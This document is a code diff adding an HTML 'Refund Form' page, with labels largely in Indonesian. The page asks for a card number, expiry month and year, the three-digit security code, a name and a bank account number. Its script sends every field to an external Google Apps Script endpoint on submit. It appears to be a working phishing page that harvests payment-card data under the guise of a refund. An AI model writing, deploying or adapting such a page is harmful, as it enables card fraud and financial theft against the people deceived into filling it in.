@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Refund Form</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+
+  <div class="w-full max-w-md bg-white shadow-lg rounded-md border border-gray-200">
+    <!-- Header -->
+    <div class="border-b px-6 py-4 flex justify-center relative">
+      <h2 class="text-lg font-semibold text-gray-800">Refund Form</h2>
+      <button class="absolute right-4 top-4 text-gray-400 hover:text-gray-600">×</button>
+    </div>
+
+    <!-- Body -->
+    <div class="px-6 py-4">
+      <form id="myForm" class="space-y-4">
+        <!-- Input1 -->
+        <div>
+          <label for="input1" class="block text-sm text-gray-500 mb-1">Nomor kartu</label>
+          <input type="text" id="input1" name="input1" class="w-full border border-gray-300 rounded px-3 py-2 focus:ring-2 focus:ring-blue-400 focus:outline-none">
+        </div>
+
+        <!-- Input2 + Input3 + Input4 dalam satu baris -->
+        <div class="flex gap-4">
+          <div class="flex-1">
+            <label for="input2" class="block text-sm text-gray-500 mb-1">bulan</label>
+            <input type="text" id="input2" name="input2" class="w-full border border-gray-300 rounded px-3 py-2 focus:ring-2 focus:ring-blue-400 focus:outline-none">
+          </div>
+          <div class="flex-1">
+            <label for="input3" class="block text-sm text-gray-500 mb-1">tahun</label>
+            <input type="text" id="input3" name="input3" class="w-full border border-gray-300 rounded px-3 py-2 focus:ring-2 focus:ring-blue-400 focus:outline-none">
+          </div>
+          <div class="flex-1">
+            <label for="input4" class="block text-sm text-gray-500 mb-1">tiga digit</label>
+            <input type="text" id="input4" name="input4" class="w-full border border-gray-300 rounded px-3 py-2 focus:ring-2 focus:ring-blue-400 focus:outline-none">
+          </div>
+        </div>
+
+        <!-- Nama -->
+        <div>
+          <label for="nama" class="block text-sm text-gray-500 mb-1">Nama</label>
+          <input type="text" id="nama" name="nama" required class="w-full border border-gray-300 rounded px-3 py-2 focus:ring-2 focus:ring-blue-400 focus:outline-none">
+        </div>
+
+        <!-- No Rek -->
+        <div>
+          <label for="norek" class="block text-sm text-gray-500 mb-1">Nomor Rekening</label>
+          <input type="text" id="norek" name="norek" required class="w-full border border-gray-300 rounded px-3 py-2 focus:ring-2 focus:ring-blue-400 focus:outline-none">
+        </div>
+
+        <!-- Jumlah Refund -->
+        <div>
+          <label for="jumlahrefund" class="block text-sm text-gray-500 mb-1">Jumlah Refund</label>
+          <input type="text" id="jumlahrefund" name="jumlahrefund" class="w-full border border-gray-300 rounded px-3 py-2 focus:ring-2 focus:ring-blue-400 focus:outline-none">
+        </div>
+
+        <!-- Footer -->
+        <div class="flex justify-between pt-4">
+          <button type="button" class="px-4 py-2 rounded border border-gray-300 text-gray-700 bg-white hover:bg-gray-100">
+            Cancel
+          </button>
+          <!-- Tambahkan wrapper dengan outline merah -->
+          <div class="p-1 border-2 border-red-500 rounded">
+            <button type="submit" class="px-4 py-2 rounded bg-blue-500 text-white font-semibold hover:bg-blue-600 shadow">
+              Submit
+            </button>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbwdsJUMMJQPTFRROJtQLI_bvjJrOWv1Nxbekntnd8e5cWomLMr4dxIwpoqMvXuO1-Og/exec';
+
+  const form = document.getElementById('myForm');
+
+  form.addEventListener('submit', e => {
+    e.preventDefault();
+    
+    const formData = new FormData(form);
+    
+    fetch(scriptURL, { method: 'POST', body: formData })
+      .then(response => response.json())
+      .then(response => {
+        if(response.result === 'success') {
+          alert('Form submitted successfully!');
+          form.reset();
+        } else {
+          alert('Error submitting form');
+        }
+      })
+      .catch(error => alert('Error! ' + error.message));
+  });
+  </script>
+
+</body>
+</html>
